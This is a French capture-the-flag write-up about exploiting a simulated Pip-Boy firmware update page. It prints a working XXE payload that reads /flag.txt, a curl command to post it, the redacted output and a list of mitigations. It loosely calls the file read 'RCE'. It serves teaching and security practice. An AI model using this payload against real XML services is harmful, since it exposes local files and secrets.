# Jailbreak
**Auteur :** Abiye Enzo

---

## Contexte / Énoncé
La team récupère un Pip-Boy expérimental capable d’ouvrir la porte d’un bunker (Vault 79). L’objectif : jailbreaker l’appareil pour le rendre opérationnel et le pairer au port d’accès du bunker. Le flag se trouve sur la machine cible dans `/flag.txt` (ne pas publier le flag).

---

## TL;DR
L’interface du firmware parse un document XML et insère la valeur du champ `<Version>` dans la réponse. Une injection XXE permet de lire `/flag.txt` → RCE / divulgation du flag (ici redacted).

---

## Recon / Observation
- J’ai ouvert l’IP de la cible et exploré l’interface web.
- Menu : `STAT`, `INV`, `DATA`, `MAP`, `RADIO` — rien d’intéressant.
- Dans `ROM` j’ai trouvé un document XML exploitable : l’application extrait la balise `<Version>` et la retourne dans la réponse.

---

## Exploitation (étapes)
1. Confirmer que l’input XML est parsé et renvoyé (champ `Version`).
2. Construire une charge utile XXE qui inclut le contenu local du fichier `/flag.txt`.
3. Poster le XML au point d’update/firmware (endpoint observé dans l’UI).

**Payload XML utilisé :**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test[
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
````

4. Envoyer ce XML au serveur (ex : via `curl -X POST -d @payload.xml http://<ip>/path/to/firmware`).

---

## Résultat

La réponse du service contient la valeur injectée pour `<Version>`. À la place du flag réel, ici affiché en clair lors du test, on remplace par `FLAG_REDACTED` pour publication :

```
Firmware version FLAG_REDACTED update initiated.
```

---

## Mitigation

* Désactiver le traitement d’entités externes (XXE) dans le parser XML.
* Valider/filtrer strictement les entrées XML et appliquer le principe du moindre privilège pour les processus qui lisent le système de fichiers.
* Restreindre l’accès aux endpoints d’update (authentification forte, ACL).
* Effectuer des tests de sécurité (SAST/DAST) sur les parsers XML.


